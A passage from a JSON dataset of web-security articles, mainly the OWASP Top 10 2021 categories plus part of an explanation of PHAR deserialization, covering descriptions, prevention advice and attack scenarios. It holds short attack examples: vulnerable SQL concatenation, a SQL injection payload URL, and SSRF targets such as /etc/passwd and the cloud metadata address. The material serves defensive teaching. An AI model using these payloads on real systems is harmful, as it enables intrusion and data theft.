`PHAR` masquerading as a simple `JPG`, you can sometimes bypass the website's validation checks. If you can then force the website to load this polyglot \"`JPG`\" from a `phar:// `stream, any harmful data you inject via the `PHAR` metadata will be deserialized. As the file extension is not checked when PHP reads a stream, it does not matter that the file uses an image extension.\n\nAs long as the class of the object is supported by the website, both the `__wakeup()` and `__destruct()` magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain using this technique.\n\nThis inventive technique was featured in our Top 10 web hacking techniques of 2018.\n\nExploiting deserialization using memory corruption\n--------------------------------------------------\n\nEven without the use of gadget chains, it is still possible to exploit insecure deserialization. If all else fails, there are often publicly documented memory corruption vulnerabilities that can be exploited via insecure deserialization. These typically lead to remote code execution.\n\nDeserialization methods, such as PHP's `unserialize()` are rarely hardened against these kinds of attacks, and expose a huge amount of attack surface. This is not always considered a vulnerability in its own right because these methods are not intended to handle user-controllable input in the first place.\n", "category": "Insecure Deserialization"}, {"title": "Broken Access Control", "content": "Moving up from the fifth position, 94% of applications were tested for some form of broken access control with the average incidence rate of 3.81%, and has the most occurrences in the contributed dataset with over 318k. Notable Common Weakness Enumerations (CWEs) included are CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-201: Insertion of Sensitive Information Into Sent Data, and CWE-352: Cross-Site Request Forgery.\nDescription\nAccess control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits. Common access control vulnerabilities include:\n* Violation of the principle of least privilege or deny by default, where access should only be granted for particular capabilities, roles, or users, but is available to anyone.\n* Bypassing access control checks by modifying the URL (parameter tampering or force browsing), internal application state, or the HTML page, or by using an attack tool modifying API requests.\n* Permitting viewing or editing someone else's account, by providing its unique identifier (insecure direct object references)\n* Accessing API with missing access controls for POST, PUT and DELETE.\n* Elevation of privilege. Acting as a user without being logged in or acting as an admin when logged in as a user.\n* Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token, or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation.\n* CORS misconfiguration allows API access from unauthorized/untrusted origins.\n* Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.\nHow to Prevent\nAccess control is only effective in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.\n* Except for public resources, deny by default.\n* Implement access control mechanisms once and re-use them throughout the application, including minimizing Cross-Origin Resource Sharing (CORS) usage.\n* Model access controls should enforce record ownership rather than accepting that the user can create, read, update, or delete any record.\n* Unique application business limit requirements should be enforced by domain models.\n* Disable web server directory listing and ensure file metadata (e.g., .git) and backup files are not present within web roots.\n* Log access control failures, alert admins when appropriate (e.g., repeated failures).\n* Rate limit API and controller access to minimize the harm from automated attack tooling.\n* Stateful session identifiers should be invalidated on the server after logout. Stateless JWT tokens should rather be short-lived so that the window of opportunity for an attacker is minimized. For longer lived JWTs it's highly recommended to follow the OAuth standards to revoke access.\nDevelopers and QA staff should include functional access control unit and integration tests.\nExample Attack Scenarios\nScenario #1: The application uses unverified data in a SQL call that is accessing account information:\npstmt.setString(1, request.getParameter(\"acct\"));\nResultSet results = pstmt.executeQuery( );\nAn attacker simply modifies the browser's 'acct' parameter to send whatever account number they want. If not correctly verified, the attacker can access any user's account.\nhttps://example.com/app/accountInfo?acct=notmyacct\nScenario #2: An attacker simply forces browses to target URLs. Admin rights are required for access to the admin page.\nhttps://example.com/app/getappInfo\nhttps://example.com/app/admin_getappInfo\nIf an unauthenticated user can access either page, it's a flaw. If a non-admin can access the admin page, this is a flaw.", "category": "Pentesting Web"}, {"title": "Cryptographic Failures", "content": "Shifting up one position to #2, previously known as Sensitive Data Exposure, which is more of a broad symptom rather than a root cause, the focus is on failures related to cryptography (or lack thereof). Which often lead to exposure of sensitive data. Notable Common Weakness Enumerations (CWEs) included are CWE-259: Use of Hard-coded Password, CWE-327: Broken or Risky Crypto Algorithm, and CWE-331 Insufficient Entropy.\nDescription\nThe first thing is to determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, personal information, and business secrets require extra protection, mainly if that data falls under privacy laws, e.g., EU's General Data Protection Regulation (GDPR), or regulations, e.g., financial data protection such as PCI Data Security Standard (PCI DSS). For all such data:\n* Is any data transmitted in clear text? This concerns protocols such as HTTP, SMTP, FTP also using TLS upgrades like STARTTLS. External internet traffic is hazardous. Verify all internal traffic, e.g., between load balancers, web servers, or back-end systems.\n* Are any old or weak cryptographic algorithms or protocols used either by default or in older code?\n* Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing? Are crypto keys checked into source code repositories?\n* Is encryption not enforced, e.g., are any HTTP headers (browser) security directives or headers missing?\n* Is the received server certificate and the trust chain properly validated?\n* Are initialization vectors ignored, reused, or not generated sufficiently secure for the cryptographic mode of operation? Is an insecure mode of operation such as ECB in use? Is encryption used when authenticated encryption is more appropriate?\n* Are passwords being used as cryptographic keys in absence of a password base key derivation function?\n* Is randomness used for cryptographic purposes that was not designed to meet cryptographic requirements? Even if the correct function is chosen, does it need to be seeded by the developer, and if not, has the developer over-written the strong seeding functionality built into it with a seed that lacks sufficient entropy/unpredictability?\n* Are deprecated hash functions such as MD5 or SHA1 in use, or are non-cryptographic hash functions used when cryptographic hash functions are needed?\n* Are deprecated cryptographic padding methods such as PKCS number 1 v1.5 in use?\n* Are cryptographic error messages or side channel information exploitable, for example in the form of padding oracle attacks?\nSee ASVS Crypto (V7), Data Protection (V9), and SSL/TLS (V10)\nHow to Prevent\nDo the following, at a minimum, and consult the references:\n* Classify data processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs.\n* Don't store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data that is not retained cannot be stolen.\n* Make sure to encrypt all sensitive data at rest.\n* Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management.\n* Encrypt all data in transit with secure protocols such as TLS with forward secrecy (FS) ciphers, cipher prioritization by the server, and secure parameters. Enforce encryption using directives like HTTP Strict Transport Security (HSTS).\n* Disable caching for response that contain sensitive data.\n* Apply required security controls as per the data classification.\n* Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.\n* Store passwords using strong adaptive and salted hashing functions with a work factor (delay factor), such as Argon2, scrypt, bcrypt or PBKDF2.\n* Initialization vectors must be chosen appropriate for the mode of operation. For many modes, this means using a CSPRNG (cryptographically secure pseudo random number generator). For modes that require a nonce, then the initialization vector (IV) does not need a CSPRNG. In all cases, the IV should never be used twice for a fixed key.\n* Always use authenticated encryption instead of just encryption.\n* Keys should be generated cryptographically randomly and stored in memory as byte arrays. If a password is used, then it must be converted to a key via an appropriate password base key derivation function.\n* Ensure that cryptographic randomness is used where appropriate, and that it has not been seeded in a predictable way or with low entropy. Most modern APIs do not require the developer to seed the CSPRNG to get security.\n* Avoid deprecated cryptographic functions and padding schemes, such as MD5, SHA1, PKCS number 1 v1.5 .\n* Verify independently the effectiveness of configuration and settings.\nExample Attack Scenarios\nScenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing a SQL injection flaw to retrieve credit card numbers in clear text.\nScenario #2: A site doesn't use or enforce TLS for all pages or supports weak encryption. An attacker monitors network traffic (e.g., at an insecure wireless network), downgrades connections from HTTPS to HTTP, intercepts requests, and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data. Instead of the above they could alter all transported data, e.g., the recipient of a money transfer.\nScenario #3: The password database uses unsalted or simple hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.", "category": "Pentesting Web"}, {"title": "Injection", "content": "Injection slides down to the third position. 94% of the applications were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3%, and 274k occurrences. Notable Common Weakness Enumerations (CWEs) included are CWE-79: Cross-site Scripting, CWE-89: SQL Injection, and CWE-73: External Control of File Name or Path.\nDescription\nAn application is vulnerable to attack when:\n* User-supplied data is not validated, filtered, or sanitized by the application.\n* Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.\n* Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.\n* Hostile data is directly used or concatenated. The SQL or command contains the structure and malicious data in dynamic queries, commands, or stored procedures.\nSome of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object Graph Navigation Library (OGNL) injection. The concept is identical among all interpreters. Source code review is the best method of detecting if applications are vulnerable to injections. Automated testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML data inputs is strongly encouraged. Organizations can include static (SAST), dynamic (DAST), and interactive (IAST) application security testing tools into the CI/CD pipeline to identify introduced injection flaws before production deployment.\nHow to Prevent\nPreventing injection requires keeping data separate from commands and queries:\n* The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).Note: Even when parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data or executes hostile data with EXECUTE IMMEDIATE or exec().\n* Use positive server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.\n* For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.Note: SQL structures such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report-writing software.\n* Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.\nExample Attack Scenarios\nScenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:\nString query = \"SELECT \\* FROM accounts WHERE custID='\" + request.getParameter(\"id\") + \"'\";\nScenario #2: Similarly, an application\u2019s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):\nQuery HQLQuery = session.createQuery(\"FROM accounts WHERE custID='\" + request.getParameter(\"id\") + \"'\");\nIn both cases, the attacker modifies the \u2018id\u2019 parameter value in their browser to send: ' UNION SLEEP(10);--. For example:\nhttp://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--\nThis changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data or even invoke stored procedures.", "category": "Pentesting Web"}, {"title": "Insecure Design", "content": "A new category for 2021 focuses on risks related to design and architectural flaws, with a call for more use of threat modeling, secure design patterns, and reference architectures. As a community we need to move beyond \"shift-left\" in the coding space to pre-code activities that are critical for the principles of Secure by Design. Notable Common Weakness Enumerations (CWEs) include CWE-209: Generation of Error Message Containing Sensitive Information, CWE-256: Unprotected Storage of Credentials, CWE-501: Trust Boundary Violation, and CWE-522: Insufficiently Protected Credentials.\nDescription\nInsecure design is a broad category representing different weaknesses, expressed as \u201cmissing or ineffective control design.\u201d Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. We differentiate between design flaws and implementation defects for a reason, they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks. One of the factors that contribute to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.\nRequirements and Resource Management\nCollect and negotiate the business requirements for an application with the business, including the protection requirements concerning confidentiality, integrity, availability, and authenticity of all data assets and the expected business logic. Take into account how exposed your application will be and if you need segregation of tenants (additionally to access control). Compile the technical requirements, including functional and non-functional security requirements. Plan and negotiate the budget covering all design, build, testing, and operation, including security activities.\nSecure Design\nSecure design is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods. Threat modeling should be integrated into refinement sessions (or similar activities); look for changes in data flows and access control or other security controls. In the user story development determine the correct flow and failure states, ensure they are well understood and agreed upon by responsible and impacted parties. Analyze assumptions and conditions for expected and failure flows, ensure they are still accurate and desirable. Determine how to validate the assumptions and enforce conditions needed for proper behaviors. Ensure the results are documented in the user story. Learn from mistakes and offer positive incentives to promote improvements. Secure design is neither an add-on nor a tool that you can add to software.\nSecure Development Lifecycle\nSecure software requires a secure development lifecycle, some form of secure design pattern, paved road methodology, secured component library, tooling, and threat modeling. Reach out for your security specialists at the beginning of a software project throughout the whole project and maintenance of your software. Consider leveraging the OWASP Software Assurance Maturity Model (SAMM) to help structure your secure software development efforts.\nHow to Prevent\n* Establish and use a secure development lifecycle with AppSec professionals to help evaluate and design security and privacy-related controls\n* Establish and use a library of secure design patterns or paved road ready to use components\n* Use threat modeling for critical authentication, access control, business logic, and key flows\n* Integrate security language and controls into user stories\n* Integrate plausibility checks at each tier of your application (from frontend to backend)\n* Write unit and integration tests to validate that all critical flows are resistant to the threat model. Compile use-cases and misuse-cases for each tier of your application.\n* Segregate tier layers on the system and network layers depending on the exposure and protection needs\n* Segregate tenants robustly by design throughout all tiers\n* Limit resource consumption by user or service\nExample Attack Scenarios\nScenario #1: A credential recovery workflow might include \u201cquestions and answers,\u201d which is prohibited by NIST 800-63b, the OWASP ASVS, and the OWASP Top 10. Questions and answers cannot be trusted as evidence of identity as more than one person can know the answers, which is why they are prohibited. Such code should be removed and replaced with a more secure design.\nScenario #2: A cinema chain allows group booking discounts and has a maximum of fifteen attendees before requiring a deposit. Attackers could threat model this flow and test if they could book six hundred seats and all cinemas at once in a few requests, causing a massive loss of income.\nScenario #3: A retail chain\u2019s e-commerce website does not have protection against bots run by scalpers buying high-end video cards to resell auction websites. This creates terrible publicity for the video card makers and retail chain owners and enduring bad blood with enthusiasts who cannot obtain these cards at any price. Careful anti-bot design and domain logic rules, such as purchases made within a few seconds of availability, might identify inauthentic purchases and rejected such transactions.", "category": "Pentesting Web"}, {"title": "Security Misconfiguration", "content": "Moving up from #6 in the previous edition, 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.%, and over 208k occurrences of a Common Weakness Enumeration (CWE) in this risk category. With more shifts into highly configurable software, it's not surprising to see this category move up. Notable CWEs included are CWE-16 Configuration and CWE-611 Improper Restriction of XML External Entity Reference.\nDescription\nThe application might be vulnerable if the application is:\n* Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.\n* Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).\n* Default accounts and their passwords are still enabled and unchanged.\n* Error handling reveals stack traces or other overly informative error messages to users.\n* For upgraded systems, the latest security features are disabled or not configured securely.\n* The security settings in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., are not set to secure values.\n* The server does not send security headers or directives, or they are not set to secure values.\n* The software is out of date or vulnerable (see A06:2021-Vulnerable and Outdated Components).\nWithout a concerted, repeatable application security configuration process, systems are at a higher risk.\nHow to Prevent\nSecure installation processes should be implemented, including:\n* A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. This process should be automated to minimize the effort required to set up a new secure environment.\n* A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.\n* A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).\n* A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).\n* Sending security directives to clients, e.g., Security Headers.\n* An automated process to verify the effectiveness of the configurations and settings in all environments.\nExample Attack Scenarios\nScenario #1: The application server comes with sample applications not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. Suppose one of these applications is the admin console, and default accounts weren't changed. In that case, the attacker logs in with default passwords and takes over.\nScenario #2: Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a severe access control flaw in the application.\nScenario #3: The application server's configuration allows detailed error messages, e.g., stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.\nScenario #4: A cloud service provider (CSP) has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.", "category": "Pentesting Web"}, {"title": "Vulnerable and Outdated Components", "content": "It was #2 from the Top 10 community survey but also had enough data to make the Top 10 via data. Vulnerable Components are a known issue that we struggle to test and assess risk and is the only category to not have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploits/impact weight of 5.0 is used. Notable CWEs included are CWE-1104: Use of Unmaintained Third-Party Components and the two CWEs from Top 10 2013 and 2017.\nDescription\nYou are likely vulnerable:\n* If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.\n* If the software is vulnerable, unsupported, or out of date. This includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.\n* If you do not scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.\n* If you do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in environments when patching is a monthly or quarterly task under change control, leaving organizations open to days or months of unnecessary exposure to fixed vulnerabilities.\n* If software developers do not test the compatibility of updated, upgraded, or patched libraries.\n* If you do not secure the components\u2019 configurations (see A05:2021-Security Misconfiguration).\nHow to Prevent\nThere should be a patch management process in place to:\n* Remove unused dependencies, unnecessary features, components, files, and documentation.\n* Continuously inventory the versions of both client-side and server-side components (e.g., frameworks, libraries) and their dependencies using tools like versions, OWASP Dependency Check, retire.js, etc. Continuously monitor sources like Common Vulnerability and Exposures (CVE) and National Vulnerability Database (NVD) for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.\n* Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component (See A08:2021-Software and Data Integrity Failures).\n* Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor, detect, or protect against the discovered issue.\nEvery organization must ensure an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.\nExample Attack Scenarios\nScenario #1: Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g., coding error) or intentional (e.g., a backdoor in a component). Some example exploitable component vulnerabilities discovered are:\n* CVE-2017-5638, a Struts 2 remote code execution vulnerability that enables the execution of arbitrary code on the server, has been blamed for significant breaches.\n* While the internet of things (IoT) is frequently difficult or impossible to patch, the importance of patching them can be great (e.g., biomedical devices).\nThere are automated tools to help attackers find unpatched or misconfigured systems. For example, the Shodan IoT search engine can help you find devices that still suffer from Heartbleed vulnerability patched in April 2014.", "category": "Pentesting Web"}, {"title": "Identification and Authentication Failures", "content": "Previously known as Broken Authentication, this category slid down from the second position and now includes Common Weakness Enumerations (CWEs) related to identification failures. Notable CWEs included are CWE-297: Improper Validation of Certificate with Host Mismatch, CWE-287: Improper Authentication, and CWE-384: Session Fixation.\nDescription\nConfirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:\n* Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.\n* Permits brute force or other automated attacks.\n* Permits default, weak, or well-known passwords, such as \"Password1\" or \"admin/admin\".\n* Uses weak or ineffective credential recovery and forgot-password processes, such as \"knowledge-based answers,\" which cannot be made safe.\n* Uses plain text, encrypted, or weakly hashed passwords data stores (see A02:2021-Cryptographic Failures).\n* Has missing or ineffective multi-factor authentication.\n* Exposes session identifier in the URL.\n* Reuse session identifier after successful login.\n* Does not correctly invalidate Session IDs. User sessions or authentication tokens (mainly single sign-on (SSO) tokens) aren't properly invalidated during logout or a period of inactivity.\nHow to Prevent\n* Where possible, implement multi-factor authentication to prevent automated credential stuffing, brute force, and stolen credential reuse attacks.\n* Do not ship or deploy with any default credentials, particularly for admin users.\n* Implement weak password checks, such as testing new or changed passwords against the top 10,000 worst passwords list.\n* Align password length, complexity, and rotation policies with National Institute of Standards and Technology (NIST) 800-63b's guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence-based password policies.\n* Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.\n* Limit or increasingly delay failed login attempts, but be careful not to create a denial of service scenario. Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.\n* Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session identifier should not be in the URL, be securely stored, and invalidated after logout, idle, and absolute timeouts.\nExample Attack Scenarios\nScenario #1: Credential stuffing, the use of lists of known passwords, is a common attack. Suppose an application does not implement automated threat or credential stuffing protection. In that case, the application can be used as a password oracle to determine if the credentials are valid.\nScenario #2: Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements encourage users to use and reuse weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and use multi-factor authentication.\nScenario #3: Application session timeouts aren't set correctly. A user uses a public computer to access an application. Instead of selecting \"logout,\" the user simply closes the browser tab and walks away. An attacker uses the same browser an hour later, and the user is still authenticated.", "category": "Pentesting Web"}, {"title": "Software and Data Integrity Failures", "content": "A new category for 2021 focuses on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data. Notable Common Weakness Enumerations (CWEs) include CWE-829: Inclusion of Functionality from Untrusted Control Sphere, CWE-494: Download of Code Without Integrity Check, and CWE-502: Deserialization of Untrusted Data.\nDescription\nSoftware and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). An insecure CI/CD pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Another example is where objects or data are encoded or serialized into a structure that an attacker can see and modify is vulnerable to insecure deserialization.\nHow to Prevent\n* Use digital signatures or similar mechanisms to verify the software or data is from the expected source and has not been altered.\n* Ensure libraries and dependencies, such as npm or Maven, are consuming trusted repositories. If you have a higher risk profile, consider hosting an internal known-good repository that's vetted.\n* Ensure that a software supply chain security tool, such as OWASP Dependency Check or OWASP CycloneDX, is used to verify that components do not contain known vulnerabilities\n* Ensure that there is a review process for code and configuration changes to minimize the chance that malicious code or configuration could be introduced into your software pipeline.\n* Ensure that your CI/CD pipeline has proper segregation, configuration, and access control to ensure the integrity of the code flowing through the build and deploy processes.\n* Ensure that unsigned or unencrypted serialized data is not sent to untrusted clients without some form of integrity check or digital signature to detect tampering or replay of the serialized data\nExample Attack Scenarios\nScenario #1 Update without signing: Many home routers, set-top boxes, device firmware, and others do not verify updates via signed firmware. Unsigned firmware is a growing target for attackers and is expected to only get worse. This is a major concern as many times there is no mechanism to remediate other than to fix in a future version and wait for previous versions to age out.\nScenario #2 SolarWinds malicious update: Nation-states have been known to attack update mechanisms, with a recent notable attack being the SolarWinds Orion attack. The company that develops the software had secure build and update integrity processes. Still, these were able to be subverted, and for several months, the firm distributed a highly targeted malicious update to more than 18,000 organizations, of which around 100 or so were affected. This is one of the most far-reaching and most significant breaches of this nature in history.\nScenario #3 Insecure Deserialization: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing the user state and passing it back and forth with each request. An attacker notices the \"rO0\" Java object signature (in base64) and uses the Java Serial Killer tool to gain remote code execution on the application server.\n* [OWASP Cheat Sheet: Software Supply Chain Security](Coming Soon)\n* [OWASP Cheat Sheet: Secure build and deployment](Coming Soon)", "category": "Pentesting Web"}, {"title": "Security Logging and Monitoring Failures", "content": "Security logging and monitoring came from the Top 10 community survey (#3), up slightly from the tenth position in the OWASP Top 10 2017. Logging and monitoring can be challenging to test, often involving interviews or asking if attacks were detected during a penetration test. There isn't much CVE/CVSS data for this category, but detecting and responding to breaches is critical. Still, it can be very impactful for accountability, visibility, incident alerting, and forensics. This category expands beyond CWE-778 Insufficient Logging to include CWE-117 Improper Output Neutralization for Logs, CWE-223 Omission of Security-relevant Information, and CWE-532Insertion of Sensitive Information into Log File.\nDescription\nReturning to the OWASP Top 10 2021, this category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs any time:\n* Auditable events, such as logins, failed logins, and high-value transactions, are not logged.\n* Warnings and errors generate no, inadequate, or unclear log messages.\n* Logs of applications and APIs are not monitored for suspicious activity.\n* Logs are only stored locally.\n* Appropriate alerting thresholds and response escalation processes are not in place or effective.\n* Penetration testing and scans by dynamic application security testing (DAST) tools (such as OWASP ZAP) do not trigger alerts.\n* The application cannot detect, escalate, or alert for active attacks in real-time or near real-time.\nYou are vulnerable to information leakage by making logging and alerting events visible to a user or an attacker (see A01:2021-Broken Access Control).\nHow to Prevent\nDevelopers should implement some or all the following controls, depending on the risk of the application:\n* Ensure all login, access control, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts and held for enough time to allow delayed forensic analysis.\n* Ensure that logs are generated in a format that log management solutions can easily consume.\n* Ensure log data is encoded correctly to prevent injections or attacks on the logging or monitoring systems.\n* Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.\n* DevSecOps teams should establish effective monitoring and alerting such that suspicious activities are detected and responded to quickly.\n* Establish or adopt an incident response and recovery plan, such as National Institute of Standards and Technology (NIST) 800-61r2 or later.\nThere are commercial and open-source application protection frameworks such as the OWASP ModSecurity Core Rule Set, and open-source log correlation software, such as the Elasticsearch, Logstash, Kibana (ELK) stack, that feature custom dashboards and alerting.\nExample Attack Scenarios\nScenario #1: A children's health plan provider's website operator couldn't detect a breach due to a lack of monitoring and logging. An external party informed the health plan provider that an attacker had accessed and modified thousands of sensitive health records of more than 3.5 million children. A post-incident review found that the website developers had not addressed significant vulnerabilities. As there was no logging or monitoring of the system, the data breach could have been in progress since 2013, a period of more than seven years.\nScenario #2: A major Indian airline had a data breach involving more than ten years' worth of personal data of millions of passengers, including passport and credit card data. The data breach occurred at a third-party cloud hosting provider, who notified the airline of the breach after some time.\nScenario #3: A major European airline suffered a GDPR reportable breach. The breach was reportedly caused by payment application security vulnerabilities exploited by attackers, who harvested more than 400,000 customer payment records. The airline was fined 20 million pounds as a result by the privacy regulator.", "category": "Pentesting Web"}, {"title": "Server Side Request Forgery (SSRF)", "content": "This category is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage and above-average Exploit and Impact potential ratings. As new entries are likely to be a single or small cluster of Common Weakness Enumerations (CWEs) for attention and awareness, the hope is that they are subject to focus and can be rolled into a larger category in a future edition.\nDescription\nSSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).\nAs modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.\nHow to Prevent\nDevelopers can prevent SSRF by implementing some or all the following defense in depth controls:\nFrom Network layer\n* Segment remote resource access functionality in separate networks to reduce the impact of SSRF\n* Enforce \u201cdeny by default\u201d firewall policies or network access control rules to block all but essential intranet traffic.Hints: ~ Establish an ownership and a lifecycle for firewall rules based on applications. ~ Log all accepted and blocked network flows on firewalls (see A09:2021-Security Logging and Monitoring Failures).\nFrom Application layer:\n* Sanitize and validate all client-supplied input data\n* Enforce the URL schema, port, and destination with a positive allow list\n* Do not send raw responses to clients\n* Disable HTTP redirections\n* Be aware of the URL consistency to avoid attacks such as DNS rebinding and \u201ctime of check, time of use\u201d (TOCTOU) race conditions\nDo not mitigate SSRF via the use of a deny list or regular expression. Attackers have payload lists, tools, and skills to bypass deny lists.\nAdditional Measures to consider:\n* Don't deploy other security relevant services on front systems (e.g. OpenID). Control local traffic on these systems (e.g. localhost)\n* For frontends with dedicated and manageable user groups use network encryption (e.g. VPNs) on independent systems to consider very high protection needs\nExample Attack Scenarios\nAttackers can use SSRF to attack systems protected behind web application firewalls, firewalls, or network ACLs, using scenarios such as:\nScenario #1: Port scan internal servers \u2013 If the network architecture is unsegmented, attackers can map out internal networks and determine if ports are open or closed on internal servers from connection results or elapsed time to connect or reject SSRF payload connections.\nScenario #2: Sensitive data exposure \u2013 Attackers can access local files or internal services to gain sensitive information such as file:///etc/passwd and http://localhost:28017/.\nScenario #3: Access metadata storage of cloud services \u2013 Most cloud providers have metadata storage such as http://169.254.169.254/. An attacker can read the metadata to gain sensitive information.\nScenario #4: Compromise internal services \u2013 The attacker can abuse internal services to conduct further attacks such as Remote Code Execution (RCE) or Denial of Service (DoS).", "category": "Pentesting Web"}]